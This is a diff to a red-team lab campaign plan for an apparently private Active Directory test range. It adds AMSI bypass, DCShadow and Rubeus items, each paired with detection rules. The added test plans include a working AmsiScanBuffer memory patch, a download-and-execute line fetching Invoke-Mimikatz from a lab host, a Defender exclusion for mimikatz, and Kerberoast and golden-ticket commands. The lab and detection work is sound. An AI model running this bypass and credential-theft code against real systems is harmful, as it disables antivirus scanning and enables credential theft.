@@ -115,13 +115,20 @@
 | **Exercise (Standalone)** | CVE-2026-41089 Netlogon RCE (PoC available — pre-auth DC crash) | 🆕 |
 | **Plan 0.8 + Track H (defensive)** | GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails) — Flatt Security 2026-06-24 | ⏳ |
 | **Phase 3 + plan1.7** | Defender Exclusion via PowerShell (T1562.001) — KQL patterns + AI-vs-human finding — Detect FYI 2026-06-24 | ⏳ |
+| **Phase 3 + plan1.7** | AMSI Bypass Techniques — Gray Hat Hacking 6th Ed | ⏳ |
+| **Phase 7 + plan1.7** | DCShadow Attack (DRS replication) — Applied Incident Response + Practical-Red-Teaming | ⏳ |
+| **Phase 1/2/7** | Rubeus/Kerberoast/AS-REP playbook cross-validation — Practical-Red-Teaming + Gray Hat Hacking 6th Ed | ⏳ |
+| **Study Ref** | Practical AI Security (2025) — CADRE-Strike LLM Security | ⏳ |
+| **Study Ref** | Cyber Threat Hunting — methodology for plan1.7 | ⏳ |
+| **Study Ref** | Practical Threat Detection Engineering — plan1.7 Sigma rules | ⏳ |
+| **Study Ref** | Windows Internals Part 1, 7th Ed — LSASS/AD internals | ⏳ |
 | **Research** | MSSQL + SCCM CVEs | 🔬 |
 | **Reference** | How We Think about Red Teading | — |
 | | Attack Paths Don't Stop at IdP | — |
 | | dirkjanm.io — AD/Azure Research Blog | — |
 | **Skip** | Don't Jump the Turnstile | ⏭️ |
 
-**Counts:** ✅ Adopted: 24 | ⏳ Pending: 55 | 🔬 Research: 4 | ⏭️ Skip: 1 | Reference: 2 | 🆕 New: 12 | **Total: 98**
+**Counts:** ✅ Adopted: 24 | ⏳ Pending: 59 | 🔬 Research: 4 | ⏭️ Skip: 1 | Reference: 2 | 🆕 New: 12 | **Total: 102**
 
 ---
 
@@ -1152,6 +1159,13 @@ psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
 | Cross-cutting (validation) | 106 | Atomic Red Team as validation framework | 🆕 Add — cross-validate manual attacks |
 | Plan 0.8 + Track H | 107 | GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails) — Flatt Security 2026-06-24 | ⏳ Pending — Plan 0.8 expansion F-11/F-12 + CADRE-Strike defensive |
 | Phase 3 + plan1.7 | 108 | Defender Exclusion via PowerShell (T1562.001) — KQL patterns + AI-vs-human finding — Detect FYI 2026-06-24 | ⏳ Pending — Phase 3 attack primitive + plan1.7 §17 detection + Track C Sigma |
+| Phase 3 + plan1.7 | 109 | AMSI Bypass Techniques (Gray Hat Hacking 6th Ed) | ⏳ Add — before mimikatz/Rubeus payload |
+| Phase 7 + plan1.7 | 110 | DCShadow Attack (DRS replication) — Applied Incident Response + Practical-Red-Teaming | ⏳ Add — alternative persistence after DCSync |
+| Phase 1/2/7 | 111 | Rubeus/Kerberoast/AS-REP playbook cross-validation | ⏳ Add — cross-validate existing Phase 1/2/7 commands |
+| Study Ref (Track H) | 112 | Practical AI Security (2025) — CADRE-Strike LLM Security | ⏳ Pending — study reference for CADRE-Strike |
+| Study Ref (plan1.7) | 113 | Cyber Threat Hunting — methodology | ⏳ Pending — study reference |
+| Study Ref (plan1.7) | 114 | Practical Threat Detection Engineering — plan1.7 Sigma | ⏳ Pending — study reference |
+| Study Ref (Phase 3.5/6) | 115 | Windows Internals Part 1, 7th Ed — LSASS/AD internals | ⏳ Pending — study reference |
 | Phase 5 (Persistence) | 39 | Named Pipe Impersonation | ⏳ Pending — priv-esc via pipe |
 | Phase 5 (Persistence) | 41 | Token Dance | ⏳ Pending — token manipulation persistence |
 | Phase 6 (Persistence) | 11 | Golden/Silver Ticket | ⏳ Pending — enhances Phase 6/7 |
@@ -1249,6 +1263,9 @@ psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
 | 106 | Atomic Red Team validation 🆕 | `Invoke-AtomicTest T1003.001,T1558.003,T1003.006 -ShowDetails` | Cross-validate manual CAMPAIGNS.md attacks — 1000+ pre-built MITRE ATT&CK tests | Same as the underlying attack (T1003.001 → Sysmon 10, etc.) |
 | 107 | GitHub Actions Supply-Chain patterns ⏳ | `npm publish --tag` + `npm dist-tag add` (analog) / `claude-code-action` defensive config (Track H) | Plan 0.8 F-11/F-12 cache poisoning + tag pollution + CADRE-Strike guardrails | Sysmon EID 1 `npm publish` from non-standard path + Zeek HTTP POST to npm registry |
 | 108 | Defender Exclusion via PowerShell ⏳ | `Add-MpPreference -ExclusionPath "C:\Users\target\AppData\Local\Temp" -ExclusionProcess "mimikatz.exe"` (T1562.001) | Runtime exclusion before mimikatz/AMSI bypass; persistence via Group Policy | WinSec 5001 (Defender config change) + WinSec 4688 (PowerShell cmdlet) + Elastic KQL `process.command_line : "*MpPreference*ExclusionPath*"` |
+| 109 | AMSI Bypass ⏳ | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` | Disable AMSI before PowerShell payload; `amsi.dll` patching via `AmsiScanBuffer` overwrite | WinSec 4104 (ScriptBlock logging) + Sysmon EID 1 `[Ref].Assembly` + Elastic KQL `process.command_line:*amsi*` |
+| 110 | DCShadow ⏳ | `mimikatz.exe` → `lsadump::dcshadow /object:CN=krbtgt,... /attribute:servicePrincipalName /value:"FAKE/spn"` | Inverse of DCSync — push fake SID history/SPN to DC via DRS replication | WinSec 4662 from non-DC source + WinSec 5136 + Zeek DCE-RPC `drsuapi` from non-DC |
+| 111 | Rubeus/Kerberoast/AS-REP cross-validation ⏳ | `Rubeus.exe asreproast /user:intern_blue /dc:192.168.77.11 /nowrap` + `kerberoast /aes` + `golden /aes256` | Verify existing Phase 1/2/7 commands against book recommendations; check for missing flags (`/rc4opsec`, `/authexp`, `/tgtdeleg`) | SID:1000015 (existing) + ET:2000002 (existing) |
 | 68 | Azure AD Connect DPAPI Dump ⏳ | `adconnectdump` on dc01 (Cloud Sync) | MSOL credentials → Entra ID bridge | Sysmon EID 1 |
 | 69 | Actor Tokens → Global Admin ⏳ | Request Actor token via PoC | Entra ID Global Admin | Entra audit log |
 | 70 | Cloud Kerberos Trust → DA ⏳ | ROADtools + Hybrid device Kerberos ticket | On-prem DA via cloud | Zeek kerberos.log + Entra log |
@@ -1879,9 +1896,16 @@ psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
 | 106 | Atomic Red Team as validation framework | Cross-cutting (validation) | 2026 | 🆕 |
 | 107 | GitHub Actions Supply-Chain Attack Patterns | Plan 0.8 + Track H | 2026 | ⏳ |
 | 108 | Defender Exclusion via PowerShell (T1562.001) | Phase 3 + plan1.7 + Track C + Track H | 2026 | ⏳ |
+| 109 | AMSI Bypass Techniques | Phase 3 + plan1.7 + Track C | 2026 | ⏳ |
+| 110 | DCShadow Attack (DRS replication) | Phase 7 + plan1.7 | 2026 | ⏳ |
+| 111 | Rubeus/Kerberoast/AS-REP cross-validation | Phase 1/2/7 | 2026 | ⏳ |
+| 112 | Practical AI Security (2025) | Track H (CADRE-Strike) | 2025 | ⏳ |
+| 113 | Cyber Threat Hunting | plan1.7 | 2025 | ⏳ |
+| 114 | Practical Threat Detection Engineering | plan1.7 | 2025 | ⏳ |
+| 115 | Windows Internals Part 1, 7th Ed | Phase 3.5 + Phase 6 | 2017 | ⏳ |
 | 59 | Electron App Backdooring (Loki C2) | Phase 3 | 2026 | ✅ |
 
-**16 new items added (Items 60-75, Dirk-jan blog)**. **Plus Item 59** (Electron backdooring). **Plus Items 76-77** (Onelogon WOOT 2026, fills #76-77 gap). **Plus Items 90-96** (7 modern AD tool updates, 2026-06-24). **Plus Items 97-107** (Skipjack, Onelogon detect ref, NetExec additions, CVE-2026-41089, ADeleg, books #100-101, 5 extracted techniques #102-106, GitHub Actions supply-chain #107). **Plus Item 108** (Defender Exclusion T1562.001 + Detect FYI 2026-06-24). **Total Tier 3: 33.**
+**16 new items added (Items 60-75, Dirk-jan blog)**. **Plus Item 59** (Electron backdooring). **Plus Items 76-77** (Onelogon WOOT 2026, fills #76-77 gap). **Plus Items 90-96** (7 modern AD tool updates, 2026-06-24). **Plus Items 97-107** (Skipjack, Onelogon detect ref, NetExec additions, CVE-2026-41089, ADeleg, books #100-101, 5 extracted techniques #102-106, GitHub Actions supply-chain #107). **Plus Item 108** (Defender Exclusion T1562.001 + Detect FYI 2026-06-24). **Plus Items 109-115** (7 ebooks survey items: AMSI bypass, DCShadow, Rubeus cross-validation, 4 study refs). **Total Tier 3: 40.**
 
 ---
 
@@ -1915,6 +1939,8 @@ This is the running index of all items by source. Updated as items are added.
 | **102-106** | **5 concrete techniques extracted from reference books** | **Same sources as #100-101** |
 | **107** | **GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails)** | **GMO Flatt Security blog Part 1 (Sato, 2026-06-24)** |
 | **108** | **Defender Exclusion via PowerShell (T1562.001) — KQL patterns + AI-vs-human finding** | **Detect FYI by Alex Teixeira (2026-06-24)** |
+| **109-111** | **3 concrete techniques extracted from ebooks/ — AMSI bypass (Gray Hat Hacking 6th Ed), DCShadow (Applied Incident Response + Practical-Red-Teaming), Rubeus cross-validation** | **Same ebooks survey sources** |
+| **112-115** | **4 study reference books (Tier 2) — Practical AI Security, Cyber Threat Hunting, Practical Threat Detection Engineering, Windows Internals Part 1** | **ebooks/ survey 2026-06-25** |
 
 **Numbering notes:**
 - #9 missing (Tier 1 skipped during original write — see Tier 1 between #8 WMI and #10 Invisible Tasks)
@@ -3529,6 +3555,333 @@ Remove-MpPreference -ExclusionProcess "mimikatz.exe"
 
 ---
 
+## CADRE-Courses/ebooks Survey (2026-06-25)
+
+**Survey scope:** All 75 .txt files in `C:\STUDY\Github\CADRE-Courses\ebooks\` surveyed via term-frequency analysis for CADRE-relevant terms (AD attack vocabulary + DFIR/detection keywords). Tier-ranked by AD match count + density + 2025+ publication date.
+
+**Survey methodology:**
+- File sizes measured; tiny/empty files flagged for skip
+- For Tier 1+2 candidates (top 30 titles by relevance): grep counts for AD attack vocabulary (mimikatz, kerberoast, DCSync, Rubeus, etc.) + DFIR terms (WinSec, Sysmon, Sigma, etc.)
+- Technique names extracted (just naming, not content)
+- Duplicates vs `CADRE-Courses/sans/pdf_extract/` and `NoStarchPress_extract/` flagged
+- Wrong-domain books (programming, OS theory, compliance, cert study, web app security) deprioritized
+
+**Survey outcome:** 11 books identified as Tier 1+2 high-value new content (not duplicates of existing sources). 3 concrete techniques extracted as new Items #109-111. See study reference library entries in CAMPAIGNS.md.
+
+### Deprioritized (Tier 3 + Skip — held for context only)
+
+**Empty / failed extractions:**
+- `Active Directory Pentesting Mind Map.txt` — 5 KB, 1 blank line (extraction failed)
+- `RITA-Cheat-Sheet.txt` — 3 KB, minimal content
+- `SANS_Cheat_Sheet_LDR553_3rd-Party_Supply_Chain.txt` — 3 KB
+- `SANS-LLM-Usage-Cheat-Sheet.txt` — 11 KB
+
+**Wrong domain (not AD/DFIR):**
+- `mdmz_book.txt` — 0 AD matches
+- `MAoS_Malware_Analysis_on_Steroids.txt` — 1 AD match
+- `Ransomware Attacks and Detection.txt` — generic
+- `Alice and Bob Learn Application Security.txt` — web app security
+- `Alice and Bob Learn Secure Coding-Wiley (2025).txt` — web app security
+- `Open_Source_Intelligence_Techniques*.txt` — OSINT (not AD)
+- `Rana-Khalil-Lab-Setup.txt` — **NOT AD** (PortSwigger Web Security Academy setup guide, Burp Suite)
+- `WinFE_Windows_Forensic_Environment.txt` — WinFE build, no AD attacks
+- `Linux Basics for Hackers, 2nd Edition.txt` — basic Linux, not AD
+
+**Programming / theory (not applicable):**
+- Grokking Algorithms, Grokking Data Structures, a-common-sense-guide-to-data-structures-and-algorithms
+- Vibe_Coding (Gene Kim/Steve Yegge)
+- Modern X86 Assembly Language Programming
+- mml-book (machine learning math)
+- Peter_N_M_Hansteen-The_Book_of_PF-EN (PF firewall)
+- How-Linux-Works-What-Every-Superuser-Should-Know (general Linux)
+- Pearson_Operating_Systems_Internals (generic OS)
+- OperatingSystem_CompleteCourse_Notes (generic OS)
+
+**Compliance / cert / methodology (not practical attack):**
+- ISOIEC_27001_2013, ISOIEC_277012019
+- nistspecialpublication800-30r1, NIST.IR.8428.pdf
+- How to Measure Anything in Cybersecurity Risk
+- CompTIA SecAI+ Study Guide
+- CC.Certified.in.Cybersecurity.All-in-One.Exam.Guide
+
+**Duplicates of existing content:**
+- `SANS DFPS_FOR500_v4.17_02-23.txt` (57 KB) — overlaps with `CADRE-Courses/sans/pdf_extract/FOR500 2024/`
+- `SANS DFPS_FOR508_v4.11_0624.txt` (33 KB) — overlaps with `CADRE-Courses/sans/pdf_extract/508/`
+- `SANS DFPS_FOR509_v1.3_02-23.txt` (10 KB) — overlaps with `CADRE-Courses/sans/pdf_extract/FOR509 2022/`
+- `SANS DFPS_FOR572_v1.12_02-23.txt` (56 KB) — overlaps with `CADRE-Courses/sans-defense/doc_extract/for572/`
+- `SANS DFPS_FOR578_v1.9_02-23.txt` (12 KB) — overlaps with existing FOR578 extract
+- `SANS DFPS_Windows-Apps-v1.4_02-.23.txt` (29 KB) — minor new content
+- `SANS DFPS_Command-Line_v1.6_02-23.txt` (45 KB) — minor new content
+- `Practical Malware Analysis.txt` — **CONFIRMED DUPLICATE** of `NoStarchPress_extract/Practical Malware Analysis/`
+
+**SANS workforce/industry surveys (no AD content):**
+- `SANS-2025-Detection-Response-Survey-251208.txt` — industry AI/ML adoption trends (context only, no techniques)
+- `SANS_WFS-2026_Digital_v3.txt` — workforce survey, no AD content
+- `UTF-8=''65.txt` — SANS poster fragment
+
+**Lower-priority Tier 3 (selective extract if needed):**
+- `Brc4.txt` (204 KB) — 28 AD matches, dense but small; supported later if needed
+- `RTFM - Red Team Field Manual v2.txt` (121 KB) — quick lookup syntax reference
+- `SANS_Ransomware_and_Cyber_Extortion.txt` (44 KB) — 43 AD matches; useful for Phase 5/7 chain context
+- `SANS-Windows-Forensic-Analysis-Playbook_v2.txt` (29 KB) — DFIR artifact reference
+- `SANS_LINUX_Incident_Response_Threat_Hunting_Poster.txt` (56 KB) — linux01 IR/hunting reference
+- `SANS_Poster_PenTest-Whiteboard_v5_0120.txt` (11 KB) — Pentest whiteboard poster
+- `Advanced Linux Detection and Forensics Cheatsheet by Defensive Security.txt` (40 KB) — linux01 auditd/eBPF
+- `eb-powershell-in-a-month-of-lunches.txt` (647 KB) — PowerShell fundamentals (Phase 3.5 scripting reference)
+
+### Tier 1 + Tier 2 Study Reference Library (11 books)
+
+**Status:** All 11 added as Study Reference entries in CAMPAIGNS.md. All 11 stubs added to CAMPAIGNS-METADATA.md. Books live at `C:\STUDY\Github\CADRE-Courses\ebooks\` — references by full path, no duplication.
+
+#### Tier 1 — HIGH value (7 books)
+
+**109. AMSI Bypass Techniques (Gray Hat Hacking 6th Ed) ⏳**
+- **Source:** Gray Hat Hacking 6th Ed (`C:\STUDY\Github\CADRE-Courses\ebooks\Gray_Hat_Hacking_The_Ethical_Hacker_s_Handbook,_Sixth_Edition,_6th\`), 1720 KB. 78 AD attack matches including **AMSI bypass x4** (no other source covers this directly).
+- **Campaign location:** Phase 3 (Execution) + Phase 5 (Persistence). AMSI bypass enables PowerShell payload execution without Defender ScriptBlock logging.
+- **Phase mapping:**
+  | Phase | Application |
+  |---|---|
+  | Phase 3 (Execution) | AMSI bypass before mimikatz/AMSI-bypass payload delivery |
+  | Phase 5 (Persistence) | Persisted AMSI bypass via WMI Event Subscription / Scheduled Task |
+  | plan1.7 §17 | DETECT AMSI bypass attempts (WinSec 4104 + PowerShell ScriptBlock logging) |
+- **CADRE applicability:** Real-world attackers ALWAYS bypass AMSI before running mimikatz/Rubeus/etc. We currently disable Defender (`04-vulnerabilities.yml`) but realistic test = AMSI bypass + payload.
+- **Test plan:**
+  ```powershell
+  # Sample AMSI bypass (multiple known techniques):
+  # 1. amsiInitFailed technique
+  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+  # 2. AmsiScanBuffer patch
+  $Win32 = @"
+  using System;
+  using System.Runtime.InteropServices;
+  public class Win32 {
+      [DllImport("kernel32")]
+      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+      [DllImport("kernel32")]
+      public static extern IntPtr LoadLibrary(string name);
+      [DllImport("kernel32")]
+      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+  }
+  "@
+  Add-Type $Win32
+  $LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
+  $Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
+  $Patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
+  $Protect = 0
+  [Win32]::VirtualProtect($Address, [UIntPtr]::SizeOf($Patch), 0x40, [ref]$Protect)
+  [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+  # Now run mimikatz — AMSI won't scan
+  iex (New-Object Net.WebClient).DownloadString('http://192.168.77.60:8080/Invoke-Mimikatz.ps1')
+  ```
+- **Detection (plan1.7 §17 held):**
+  - WinSec 4104 (PowerShell ScriptBlock logging) — capture bypass code
+  - Sysmon EID 1 — `powershell.exe` + `[Ref].Assembly` OR `amsi.dll` in command line
+  - Elastic KQL: `process.command_line:*amsi* or process.command_line:*AmsiScanBuffer*`
+  - Sigma: `win_amsi_bypass.yml` candidate
+- **Cross-references:** Item #106 (Atomic Red Team T1566/T1059), plan1.7 §17, Track C (Sigma), Gray Hat Hacking 6th Ed chapter on bypassing AV.
+
+**110. DCShadow Attack (Applied Incident Response + Practical-Red-Teaming) ⏳**
+- **Sources:** Applied Incident Response (Anson, `C:\STUDY\Github\CADRE-Courses\ebooks\Applied Incident Response\`), 1002 KB (146 AD matches: DCShadow x5). Practical-Red-Teaming (Tumne 2023, `C:\STUDY\Github\CADRE-Courses\ebooks\Practical-Red-Teaming\`), 317 KB.
+- **Campaign location:** Phase 7 (Privilege Escalation). DCShadow is the **inverse of DCSync** — instead of pulling data from DC, attacker **pushes changes** (fake SID history, fake SPN, fake group membership).
+- **Phase mapping:**
+  | Phase | Application |
+  |---|---|
+  | Phase 7 (Privilege Escalation) | DCShadow to inject fake SID history into krbtgt |
+  | Phase 8 (Forest Trust) | DCShadow across forests (fake trust attributes) |
+  | plan1.7 §17 | DETECT DCShadow via DRS replication events (rare in healthy env) |
+- **CADRE applicability:** Rare technique (not in our current campaign). Provides stealthy persistence alternative to DCSync. Mimikatz `dcshadow` command available.
+- **Test plan:**
+  ```powershell
+  # On mbr01 as DA (post-Phase 6)
+  mimikatz.exe
+  privilege::debug
+  lsadump::dcshadow /object:CN=krbtgt,CN=Users,DC=child,DC=cadre,DC=local /attribute:servicePrincipalName /value:"FAKE/spn"
+  # Requires 2 sessions: one to register, one to push
+  ```
+- **Detection (plan1.7 §17 held):**
+  - WinSec 4662 (DS Object Access) — high-volume on DC from non-DC source
+  - WinSec 5136 (Directory Service Changes) — schema attribute modified
+  - DRS replication event from non-DC IP
+  - Zeek DCE-RPC — `drsuapi` replication from non-DC
+  - Elastic KQL: `event.code:4662 and source.ip:(* and not 192.168.77.10,11,12) and winlog.event_data.ObjectDN:*CN=*`
+- **Cross-references:** Item #66 (Forest Trust SID Filtering), Phase 6 (DCSync — opposite direction), plan1.7 §17.
+
+**111. Rubeus/Kerberoast/AS-REP playbook cross-validation (Practical-Red-Teaming + Gray Hat Hacking 6th Ed) ⏳**
+- **Sources:** Practical-Red-Teaming (Tumne 2023, 317 KB, 81 AD matches: Mimikatz x34, Rubeus x7, Kerberoast x4, Golden Ticket x3, Zerologon). Gray Hat Hacking 6th Ed (1720 KB, Rubeus x5, Kerberoast x4, AS-REP x3, DCSync x5).
+- **Campaign location:** Phase 1 (Initial Access) + Phase 2 (Credential Harvesting). Cross-validates our existing Rubeus commands and may have additional flags.
+- **Phase mapping:**
+  | Phase | Application |
+  |---|---|
+  | Phase 1 (AS-REP) | Verify Rubeus AS-REP flags match book recommendations |
+  | Phase 2 (Kerberoast) | Verify AES Kerberoast + ticket extraction flags |
+  | Phase 7 (Golden Ticket) | Verify Rubeus `golden` command + SID history injection |
+- **CADRE applicability:** Cross-validation of Phase 1-2 against field-tested playbooks. May reveal flags we missed (e.g., `/rc4opsec`, `/aes`, `/authexp`, `/spn`, `/tgtdeleg`).
+- **Test plan:**
+  ```powershell
+  # Cross-validate Phase 1 (AS-REP) with Rubeus
+  .\Rubeus.exe asreproast /user:intern_blue /dc:192.168.77.11 /nowrap
+
+  # Cross-validate Phase 2 (Kerberoast) — AES preferred (mode 13100)
+  .\Rubeus.exe kerberoast /user:svc_mssql /domain:child.cadre.local /dc:192.168.77.11 /aes /nowrap
+
+  # Cross-validate Phase 7 (Golden Ticket)
+  .\Rubeus.exe golden /aes256 /user:Administrator /domain:child.cadre.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
+  ```
+- **Detection (existing, verify):** SID:1000015 (Kerberoast burst), ET:2000002 (AS-REP roast). Cross-validate against our existing 12 Suricata fires baseline.
+- **Cross-references:** Existing Phase 1 Mechanics, Phase 2 Mechanics, Phase 7 Mechanics, Item #90 (NetExec — alternative), plan1.7 §17.
+
+#### Tier 2 — MEDIUM value (4 books, study only)
+
+- **112. Practical AI Security (2025) — CADRE-Strike LLM Security Study Ref** ⏳
+- **113. Cyber Threat Hunting — Methodology Study Ref** ⏳
+- **114. Practical Threat Detection Engineering — plan1.7 Study Ref** ⏳
+- **115. Windows Internals Part 1, 7th Ed — LSASS/AD Internals Study Ref** ⏳
+
+(See CAMPAIGNS.md Study Reference Library + CAMPAIGNS-METADATA.md stubs for full chapter-to-phase mappings.)
+
+**CADRE applicability (all 4):** Study reference material only — no new attack Mechanics, no new Phase additions. Per workflow principle: "books are reference material, but specific attack techniques IN them should be extracted as new items."
+
+### Tier 1 + 2 Study Reference Library (11 books)
+
+**Status:** All 11 added as Study Reference entries in CAMPAIGNS.md. All 11 stubs added to CAMPAIGNS-METADATA.md.
+
+#### Tier 1 (7 books — full reference)
+
+1. **SANS Purple Team Tools Poster** (Van Buggenhout/Bauters, 64 KB) — single highest-value. Whole kill-chain reference + MITRE technique IDs for FIN6/APT28/APT33 emulation.
+2. **Practical-Red-Teaming** (Tumne 2023, 317 KB) — field-tested red team playbooks; cross-validates Phase 1-3.
+3. **Applied Incident Response** (Anson, 1002 KB) — 14-chapter DFIR textbook; cross-validates our telemetry sources.
+4. **Gray Hat Hacking 6th Ed** (1720 KB) — industry handbook; AMSI bypass, DCSync, Rubeus.
+5. **Windows Internals Part 1, 7th Ed** (2017, 1720 KB) — LSASS/UAC/Kerberos/Credential Guard internals companion.
+6. **Cyber Threat Hunting** (838 KB) — hypothesis-driven hunting + ML clustering + deception.
+7. **Practical Threat Detection Engineering** (616 KB) — methodology + Sigma rule writing.
+
+#### Tier 2 (4 books — selective reference)
+
+8. **Practical AI Security** (2025, 837 KB) — LLM security (prompt injection, RAG poisoning) for CADRE-Strike.
+9. **Brc4** (204 KB) — dense AD cheat sheet.
+10. **Windows Internals Part 2, 7th Ed** (2021, 1720 KB) — storage/I/O/registry internals.
+11. **eb-powershell-in-a-month-of-lunches** (647 KB) — PowerShell fundamentals for Phase 3.5/5+ scripting.
+
+---
+
+### 109. AMSI Bypass Techniques (Gray Hat Hacking 6th Ed) ⏳
+
+**Status:** ⏳ NEW (2026-06-25 session 13). Source: Gray Hat Hacking 6th Ed.
+
+**Campaign location:** Phase 3 (Execution) + Phase 5 (Persistence). AMSI bypass enables PowerShell payload execution without Defender ScriptBlock logging.
+
+**Phase mapping:**
+| Phase | Application |
+|---|---|
+| Phase 3 (Execution) | AMSI bypass before mimikatz/Rubeus payload delivery |
+| Phase 5 (Persistence) | Persisted AMSI bypass via WMI Event Subscription / Scheduled Task |
+| plan1.7 §17 | DETECT AMSI bypass attempts (WinSec 4104 + Sysmon) |
+
+**CADRE applicability:** Real-world attackers ALWAYS bypass AMSI before running mimikatz/Rubeus. We currently disable Defender (`04-vulnerabilities.yml`) but realistic test = AMSI bypass + payload.
+
+**Detection (plan1.7 §17 held):**
+- WinSec 4104 (PowerShell ScriptBlock logging) — capture bypass code
+- Sysmon EID 1 — `powershell.exe` + `[Ref].Assembly` OR `amsi.dll`
+- Elastic KQL: `process.command_line:*amsi* or process.command_line:*AmsiScanBuffer*`
+- Sigma: `win_amsi_bypass.yml` candidate
+
+**Cross-references:** Gray Hat Hacking 6th Ed chapter, Item #106 (Atomic Red Team T1566/T1059), plan1.7 §17, Track C (Sigma).
+
+---
+
+### 110. DCShadow Attack (Applied Incident Response + Practical-Red-Teaming) ⏳
+
+**Status:** ⏳ NEW (2026-06-25 session 13). Sources: Applied Incident Response + Practical-Red-Teaming.
+
+**Campaign location:** Phase 7 (Privilege Escalation). DCShadow is the **inverse of DCSync** — attacker **pushes changes** (fake SID history, fake SPN, fake group membership).
+
+**Phase mapping:**
+| Phase | Application |
+|---|---|
+| Phase 7 (Privilege Escalation) | DCShadow to inject fake SID history into krbtgt |
+| Phase 8 (Forest Trust) | DCShadow across forests (fake trust attributes) |
+| plan1.7 §17 | DETECT DCShadow via DRS replication events |
+
+**CADRE applicability:** Rare technique (not in current campaign). Provides stealthy persistence alternative to DCSync. Mimikatz `dcshadow` command.
+
+**Detection (plan1.7 §17 held):**
+- WinSec 4662 (DS Object Access) — high-volume from non-DC source
+- WinSec 5136 (Directory Service Changes)
+- DRS replication event from non-DC IP
+- Zeek DCE-RPC `drsuapi` from non-DC
+
+**Cross-references:** Phase 6 (DCSync — opposite direction), Item #66 (Forest Trust SID Filtering), plan1.7 §17.
+
+---
+
+### 111. Rubeus/Kerberoast/AS-REP playbook cross-validation ⏳
+
+**Status:** ⏳ NEW (2026-06-25 session 13). Sources: Practical-Red-Teaming + Gray Hat Hacking 6th Ed.
+
+**Campaign location:** Phase 1 (Initial Access) + Phase 2 (Credential Harvesting). Cross-validates our existing Rubeus commands.
+
+**Phase mapping:**
+| Phase | Application |
+|---|---|
+| Phase 1 (AS-REP) | Verify Rubeus AS-REP flags match book recommendations |
+| Phase 2 (Kerberoast) | Verify AES Kerberoast + ticket extraction flags |
+| Phase 7 (Golden Ticket) | Verify Rubeus `golden` command + SID history injection |
+
+**CADRE applicability:** Cross-validation of Phase 1-2 against field-tested playbooks. May reveal flags we missed.
+
+**Cross-references:** Existing Phase 1, 2, 7 Mechanics, Item #90 (NetExec — alternative), plan1.7 §17.
+
+---
+
+### 112. Practical AI Security (2025) — CADRE-Strike LLM Security Study Ref ⏳
+
+**Status:** ⏳ Study reference (2026-06-25 session 13). Source: Practical AI Security (2025), `C:\STUDY\Github\CADRE-Courses\ebooks\Practical AI Security\`, 837 KB.
+
+**Campaign location:** Study reference only — no new Phase additions.
+
+**CADRE applicability:** Fills CADRE-Strike LLM security gap. 75 prompt injection + 112 RAG + 41 backdoor + 29 supply chain mentions.
+
+**Cross-references:** Track H (CADRE-Strike), Item #107 (GitHub Actions guardrails), Item #108 (AI-vs-human finding).
+
+---
+
+### 113. Cyber Threat Hunting — Methodology Study Ref ⏳
+
+**Status:** ⏳ Study reference (2026-06-25 session 13). Source: `C:\STUDY\Github\CADRE-Courses\ebooks\Cyber_TH\`, 838 KB.
+
+**Campaign location:** Study reference only.
+
+**CADRE applicability:** Hypothesis-driven hunting + ML clustering + deception + MITRE ATT&CK mapping. Direct plan1.7 reference.
+
+**Cross-references:** plan1.7, Track D (NSM Dashboards), Item #106 (Atomic Red Team validation).
+
+---
+
+### 114. Practical Threat Detection Engineering — plan1.7 Study Ref ⏳
+
+**Status:** ⏳ Study reference (2026-06-25 session 13). Source: `C:\STUDY\Github\CADRE-Courses\ebooks\Practical.Threat.Detection.Engineering\`, 616 KB.
+
+**Campaign location:** Study reference only.
+
+**CADRE applicability:** Methodology + Whisker (Shadow Credentials) x3 + ProcDump x8 + Zerologon. Direct plan1.7 Sigma rule writing reference.
+
+**Cross-references:** plan1.7 §16 (Sigma), Track C (Sigma Rule Library).
+
+---
+
+### 115. Windows Internals Part 1, 7th Ed — LSASS/AD Internals Study Ref ⏳
+
+**Status:** ⏳ Study reference (2026-06-25 session 13). Source: `C:\STUDY\Github\CADRE-Courses\ebooks\Windows Internals, Part 1, 7th Edition - 2017\`, 1720 KB.
+
+**Campaign location:** Study reference only.
+
+**CADRE applicability:** Supplements `WindowsSecurityInternals` with deeper internals (token x435, LSASS x98, UAC x78, Credential Guard x47, Kerberos x30, AD x23, TGT x18). Direct relevance to Phase 3.5 (Credential Theft) + Phase 6 (Lateral Movement).
+
+**Cross-references:** Phase 3.5, Phase 6, Item #100 (WindowsSecurityInternals — companion), plan1.7.
+
+---
+
 ## Next Actions / Parallel Tracks (After Campaign Verification)
 
 These are high-level tracks to pursue **after** the primary campaign (Phases 0-8 + Branches) is fully verified end-to-end. Do not start these until campaign validation is complete.
@@ -3753,3 +4106,5 @@ Phase 4-8: DCSync, RBCD, ADCS, forest trust (all work)
